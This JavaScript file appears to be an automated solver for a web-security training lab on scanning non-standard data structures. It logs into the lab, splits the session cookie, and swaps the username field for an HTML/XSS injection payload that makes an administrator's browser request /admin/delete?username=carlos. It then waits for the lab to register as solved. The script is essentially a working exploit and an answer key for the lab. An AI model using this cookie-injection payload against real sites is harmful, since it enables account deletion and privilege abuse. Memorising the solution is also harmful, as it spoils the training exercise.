const { runLab, labLogin, isSolved } = require('./_common.cjs');

const TITLE = 'Scanning non-standard data structures';
const PATH = '/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures';

async function waitSolved(page, labUrl, attempts = 18, delay = 5000) {
  for (let i = 0; i < attempts; i += 1) {
    if (await isSolved(page, labUrl)) return true;
    await page.waitForTimeout(delay);
  }
  return false;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, context, labUrl }) => {
    await labLogin(page, labUrl);
    await page.goto(`${labUrl}/my-account?id=wiener`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    const cookies = await context.cookies(labUrl);
    const sessionCookie = cookies.find((cookie) => /session/i.test(cookie.name));
    const decodedValue = decodeURIComponent(sessionCookie?.value || '');
    if (!sessionCookie || !decodedValue.includes(':')) {
      throw new Error('session cookie format mismatch');
    }

    const [, token] = decodedValue.split(':');
    const payload = `'\"><img src=/admin/delete?username=carlos>`;
    const cookieValue = `${encodeURIComponent(payload)}%3a${token}`;
    await context.addCookies([
      { name: sessionCookie.name, value: cookieValue, domain: new URL(labUrl).hostname, path: '/' },
    ]);

    await page.goto(`${labUrl}/my-account?id=wiener`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    await waitSolved(page, labUrl, 18, 5000);
  },
});
